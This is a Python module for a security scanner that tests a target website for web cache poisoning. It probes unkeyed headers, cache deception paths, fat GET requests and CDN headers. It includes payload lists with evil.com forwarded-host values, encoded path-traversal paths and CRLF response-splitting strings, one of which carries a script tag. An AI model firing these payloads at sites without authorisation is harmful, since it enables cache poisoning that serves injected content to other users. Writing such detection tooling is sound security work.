"""C18 – Web cache poisoning tester.

Discovers unkeyed headers, tests cache deception paths, path normalisation
exploits, fat GET poisoning, response splitting, and CDN-specific techniques.
"""

from __future__ import annotations

import asyncio
import hashlib
import random
import string
import time
from datetime import datetime
from typing import Any
from urllib.parse import urlencode, urlparse, urlunparse

import httpx

from app.modules.base_module import BaseModule

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

# Headers to test for unkeyed reflection
_UNKEYED_HEADERS: list[dict[str, str]] = [
    {"X-Forwarded-Host": "evil.com"},
    {"X-Host": "evil.com"},
    {"X-Forwarded-For": "evil.com"},
    {"X-Original-URL": "/evil"},
    {"X-Rewrite-URL": "/evil"},
    {"True-Client-IP": "1.2.3.4"},
    {"X-Forwarded-Proto": "evil"},
    {"X-Forwarded-Scheme": "nothttps"},
    {"X-Forwarded-Port": "9999"},
    {"Forwarded": "host=evil.com"},
]

# CDN-specific debug/cache headers
_CDN_HEADERS: list[dict[str, str]] = [
    {"Fastly-Debug-Path": "1"},       # Fastly
    {"X-Varnish": "12345"},            # Varnish
    {"Surrogate-Key": "test"},         # Fastly/Varnish
    {"cf-edge-cache": "no-transform"}, # Cloudflare
    {"CDN-Loop": "cloudflare"},        # Cloudflare
    {"X-Cache-Key": "test"},           # Generic
    {"X-Drupal-Cache": "test"},        # Drupal
]

# Cache deception / path confusion paths
_CACHE_DECEPTION_PATHS = [
    "/robots.txt/../",
    "/account/..%2f",
    "/account/%2e%2e/",
    "/api/user.jpg",
    "/api/user.css",
    "/api/user.js",
    "/api/user.png",
    "/profile/;.css",
    "/settings/..%2F",
]

# Response splitting payloads (via header injection)
_RESPONSE_SPLITTING_PAYLOADS = [
    "evil.com\r\nX-Injected: injected",
    "evil.com\r\n\r\n<script>alert(1)</script>",
    "evil.com%0d%0aX-Injected: injected",
    "evil.com%0aX-Injected: injected",
]

# Parameter exclusion cache key test
_EXCLUDED_PARAMS = ["utm_source", "utm_medium", "fbclid", "gclid", "_ga", "ref"]

# Canary value to detect reflection
_CANARY_CHARS = string.ascii_lowercase + string.digits


def _canary() -> str:
    return "cp-" + "".join(random.choices(_CANARY_CHARS, k=12))


# ---------------------------------------------------------------------------
# Module
# ---------------------------------------------------------------------------


class CachePoisoningTester(BaseModule):
    """Web cache poisoning tester.

    Discovers unkeyed headers, tests cache deception, path normalisation,
    fat GET, response splitting, CDN-specific headers, and cache key manipulation.
    """

    name = "cache_poisoning"
    description = (
        "Tests for web cache poisoning via unkeyed headers, cache deception, "
        "fat GET, response splitting, CDN-specific techniques, and cache key manipulation."
    )
    version = "1.0.0"
    category = "web_security"

    async def run(self, target: str, **kwargs) -> dict[str, Any]:
        """Run cache poisoning tests against *target*.

        Args:
            target: Base URL of the target application.
            **kwargs:
                path (str): Path to test (default: /).
                timeout (int): HTTP timeout in seconds (default: 10).
                concurrency (int): Max parallel requests (default: 10).

        Returns:
            Dict with ``findings``, ``probe_results``, and metadata.
        """
        self.started_at = datetime.utcnow()
        base = _normalise_url(target)
        path: str = kwargs.get("path", "/")
        timeout = int(kwargs.get("timeout", 10))
        concurrency = min(int(kwargs.get("concurrency", 10)), 30)

        probe_results: list[dict[str, Any]] = []
        sem = asyncio.Semaphore(concurrency)

        async with httpx.AsyncClient(
            timeout=timeout, verify=False, follow_redirects=False,
            limits=httpx.Limits(max_connections=concurrency, max_keepalive_connections=concurrency),
        ) as client:
            tasks = [
                self._test_unkeyed_headers(client, base, path, sem),
                self._test_cache_deception(client, base, sem),
                self._test_path_normalisation(client, base, path, sem),
                self._test_fat_get(client, base, path, sem),
                self._test_response_splitting(client, base, path, sem),
                self._test_cdn_headers(client, base, path, sem),
                self._test_param_exclusion(client, base, path, sem),
            ]
            batch = await asyncio.gather(*tasks, return_exceptions=True)

        for result in batch:
            if isinstance(result, list):
                probe_results.extend(result)

        self.completed_at = datetime.utcnow()
        return {
            "module": self.name,
            "target": base,
            "findings": self.results,
            "probe_results": probe_results,
            "started_at": self.started_at.isoformat(),
            "completed_at": self.completed_at.isoformat(),
        }

    # ------------------------------------------------------------------ #
    # Unkeyed header discovery                                             #
    # ------------------------------------------------------------------ #

    async def _test_unkeyed_headers(
        self, client: httpx.AsyncClient, base: str, path: str, sem: asyncio.Semaphore
    ) -> list[dict[str, Any]]:
        """Test each candidate header to see if its value appears in the response."""
        results: list[dict[str, Any]] = []
        url = base.rstrip("/") + path

        for header_dict in _UNKEYED_HEADERS:
            header_name = next(iter(header_dict))
            canary_val = _canary()
            test_headers = {header_name: canary_val}
            resp = await _safe_get(client, url, sem, headers=test_headers)
            if resp is None:
                continue
            reflected = _reflected_in_response(resp, canary_val)
            result = {
                "type": "unkeyed_header",
                "header": header_name,
                "canary": canary_val,
                "reflected": reflected,
                "status": resp.status_code,
            }
            results.append(result)
            if reflected:
                self.add_finding(
                    title=f"Unkeyed header reflected: {header_name}",
                    severity="high",
                    description=(
                        f"The value of the '{header_name}' header was reflected in the "
                        f"response from '{url}'. If this response is cached, an attacker "
                        "can poison the cache for other users."
                    ),
                    evidence=f"Canary '{canary_val}' reflected in response body or headers",
                    url=url,
                    header=header_name,
                )
        return results

    # ------------------------------------------------------------------ #
    # Cache deception                                                      #
    # ------------------------------------------------------------------ #

    async def _test_cache_deception(
        self, client: httpx.AsyncClient, base: str, sem: asyncio.Semaphore
    ) -> list[dict[str, Any]]:
        """Test cache deception paths — server returns dynamic content cached under static path."""
        results: list[dict[str, Any]] = []
        for path in _CACHE_DECEPTION_PATHS:
            url = base.rstrip("/") + path
            resp1 = await _safe_get(client, url, sem)
            if resp1 is None:
                continue
            # Check if the response looks dynamic (contains personalised data markers)
            dynamic_markers = ["token", "session", "user", "account", "csrf", "auth"]
            text = _safe_text(resp1)
            is_dynamic = any(m in text.lower() for m in dynamic_markers)
            cache_header = resp1.headers.get("x-cache", "") + resp1.headers.get("cf-cache-status", "")
            is_cached = "hit" in cache_header.lower()
            result = {
                "type": "cache_deception",
                "path": path,
                "status": resp1.status_code,
                "is_dynamic": is_dynamic,
                "is_cached": is_cached,
            }
            results.append(result)
            if is_dynamic and is_cached:
                self.add_finding(
                    title=f"Cache deception: dynamic content cached at {path}",
                    severity="high",
                    description=(
                        f"The path '{path}' returns dynamic content that appears to be "
                        "cached. An attacker could trick a victim into loading this URL, "
                        "then retrieve the cached sensitive data."
                    ),
                    evidence=f"Cache header: {cache_header}, dynamic markers found",
                    url=url,
                )
        return results

    # ------------------------------------------------------------------ #
    # Path normalisation                                                   #
    # ------------------------------------------------------------------ #

    async def _test_path_normalisation(
        self, client: httpx.AsyncClient, base: str, path: str, sem: asyncio.Semaphore
    ) -> list[dict[str, Any]]:
        """Test URL encoding differences that may result in cache key mismatches."""
        results: list[dict[str, Any]] = []
        canonical_url = base.rstrip("/") + path
        # Encoded variants of the same path
        variants = [
            base.rstrip("/") + path.replace("/", "%2F"),
            base.rstrip("/") + path.replace("/", "%2f"),
            base.rstrip("/") + path + "%20",
            base.rstrip("/") + path + ";",
            base.rstrip("/") + path + "?",
        ]
        resp_canonical = await _safe_get(client, canonical_url, sem)
        canonical_body = _safe_text(resp_canonical) if resp_canonical else ""

        for variant in variants:
            resp = await _safe_get(client, variant, sem)
            if resp is None:
                continue
            variant_body = _safe_text(resp)
            same_response = (
                resp.status_code == (resp_canonical.status_code if resp_canonical else -1)
                and len(variant_body) == len(canonical_body)
            )
            result = {
                "type": "path_normalisation",
                "variant": variant,
                "status": resp.status_code,
                "same_as_canonical": same_response,
            }
            results.append(result)
            if same_response and resp.status_code == 200:
                self.add_finding(
                    title="Cache path normalisation difference",
                    severity="medium",
                    description=(
                        f"The URL-encoded variant '{variant}' returns the same response as "
                        f"the canonical URL '{canonical_url}'. If the cache treats these as "
                        "different keys, cache poisoning may be possible."
                    ),
                    evidence=f"Status: {resp.status_code}",
                    url=variant,
                )
        return results

    # ------------------------------------------------------------------ #
    # Fat GET                                                              #
    # ------------------------------------------------------------------ #

    async def _test_fat_get(
        self, client: httpx.AsyncClient, base: str, path: str, sem: asyncio.Semaphore
    ) -> list[dict[str, Any]]:
        """Send a GET request with a body to test fat GET cache poisoning."""
        url = base.rstrip("/") + path
        canary_val = _canary()
        body = f"injected={canary_val}"
        try:
            async with sem:
                resp = await client.request(
                    "GET", url,
                    content=body.encode(),
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                )
        except Exception:
            return []

        reflected = _reflected_in_response(resp, canary_val)
        result = {
            "type": "fat_get",
            "url": url,
            "canary": canary_val,
            "reflected": reflected,
            "status": resp.status_code,
        }
        if reflected:
            self.add_finding(
                title="Fat GET body reflected in response",
                severity="medium",
                description=(
                    f"A GET request with a body was sent to '{url}'. The body value "
                    f"(canary: {canary_val}) was reflected in the response. If cached, "
                    "this could enable cache poisoning via fat GET."
                ),
                evidence=f"Canary '{canary_val}' reflected in {resp.status_code} response",
                url=url,
            )
        return [result]

    # ------------------------------------------------------------------ #
    # Response splitting                                                   #
    # ------------------------------------------------------------------ #

    async def _test_response_splitting(
        self, client: httpx.AsyncClient, base: str, path: str, sem: asyncio.Semaphore
    ) -> list[dict[str, Any]]:
        """Attempt header injection via unkeyed headers to detect response splitting."""
        results: list[dict[str, Any]] = []
        url = base.rstrip("/") + path
        for payload in _RESPONSE_SPLITTING_PAYLOADS:
            headers = {"X-Forwarded-Host": payload}
            try:
                async with sem:
                    resp = await client.get(url, headers=headers)
                if "X-Injected" in resp.headers or "x-injected" in resp.headers:
                    self.add_finding(
                        title="Response splitting via header injection",
                        severity="critical",
                        description=(
                            f"The injected header payload was reflected as a response header, "
                            "enabling HTTP response splitting. An attacker can inject arbitrary "
                            "headers or split responses."
                        ),
                        evidence=f"X-Injected header found in response",
                        url=url,
                        payload=payload[:80],
                    )
                    results.append({
                        "type": "response_splitting",
                        "payload": payload[:80],
                        "status": resp.status_code,
                        "injected": True,
                    })
            except Exception:
                continue
        return results

    # ------------------------------------------------------------------ #
    # CDN-specific headers                                                 #
    # ------------------------------------------------------------------ #

    async def _test_cdn_headers(
        self, client: httpx.AsyncClient, base: str, path: str, sem: asyncio.Semaphore
    ) -> list[dict[str, Any]]:
        """Send CDN-specific debug headers and check if they alter the response."""
        results: list[dict[str, Any]] = []
        url = base.rstrip("/") + path
        baseline_resp = await _safe_get(client, url, sem)
        baseline_body = _safe_text(baseline_resp) if baseline_resp else ""

        for header_dict in _CDN_HEADERS:
            header_name = next(iter(header_dict))
            canary_val = _canary()
            resp = await _safe_get(client, url, sem, headers={header_name: canary_val})
            if resp is None:
                continue
            body = _safe_text(resp)
            cdn_response_headers = {k: v for k, v in resp.headers.items() if "cdn" in k.lower() or "cache" in k.lower() or "varnish" in k.lower() or "fastly" in k.lower()}
            reflected = canary_val in body or canary_val in str(resp.headers)
            result = {
                "type": "cdn_header",
                "header": header_name,
                "canary": canary_val,
                "reflected": reflected,
                "cdn_headers": cdn_response_headers,
            }
            results.append(result)
            if reflected:
                self.add_finding(
                    title=f"CDN header reflected: {header_name}",
                    severity="medium",
                    description=(
                        f"The CDN debug header '{header_name}' value was reflected in the "
                        "response. Depending on the CDN configuration, this may allow "
                        "cache poisoning."
                    ),
                    evidence=f"Canary '{canary_val}' found in response",
                    url=url,
                    header=header_name,
                )
        return results

    # ------------------------------------------------------------------ #
    # Cache key parameter exclusion                                        #
    # ------------------------------------------------------------------ #

    async def _test_param_exclusion(
        self, client: httpx.AsyncClient, base: str, path: str, sem: asyncio.Semaphore
    ) -> list[dict[str, Any]]:
        """Check if tracking parameters are excluded from the cache key."""
        results: list[dict[str, Any]] = []
        url = base.rstrip("/") + path
        baseline_resp = await _safe_get(client, url, sem)
        baseline_body = _safe_text(baseline_resp)[:1000] if baseline_resp else ""

        for param in _EXCLUDED_PARAMS:
            canary_val = _canary()
            test_url = f"{url}?{param}={canary_val}"
            resp = await _safe_get(client, test_url, sem)
            if resp is None:
                continue
            body = _safe_text(resp)[:1000]
            param_excluded = (body == baseline_body and resp.status_code == (baseline_resp.status_code if baseline_resp else -1))
            result = {
                "type": "param_exclusion",
                "param": param,
                "excluded_from_cache_key": param_excluded,
            }
            results.append(result)
            if param_excluded:
                self.add_finding(
                    title=f"Cache key excludes parameter: {param}",
                    severity="low",
                    description=(
                        f"The parameter '{param}' appears to be excluded from the cache key "
                        "(the response is identical to the baseline). If the parameter "
                        "influences the response content, cache poisoning may be possible."
                    ),
                    evidence=f"Identical response with ?{param}={canary_val}",
                    url=test_url,
                    param=param,
                )
        return results


# ---------------------------------------------------------------------------
# Utilities
# ---------------------------------------------------------------------------


def _normalise_url(target: str) -> str:
    if not target.startswith(("http://", "https://")):
        return f"https://{target}"
    return target


def _safe_text(resp: httpx.Response | None) -> str:
    if resp is None:
        return ""
    try:
        return resp.text
    except Exception:
        return ""


async def _safe_get(
    client: httpx.AsyncClient,
    url: str,
    sem: asyncio.Semaphore,
    headers: dict[str, str] | None = None,
) -> httpx.Response | None:
    try:
        async with sem:
            return await client.get(url, headers=headers or {})
    except Exception:
        return None


def _reflected_in_response(resp: httpx.Response, value: str) -> bool:
    """Check if *value* appears in response body or headers."""
    text = _safe_text(resp)
    if value in text:
        return True
    for v in resp.headers.values():
        if value in v:
            return True
    location = resp.headers.get("location", "")
    if value in location:
        return True
    return False
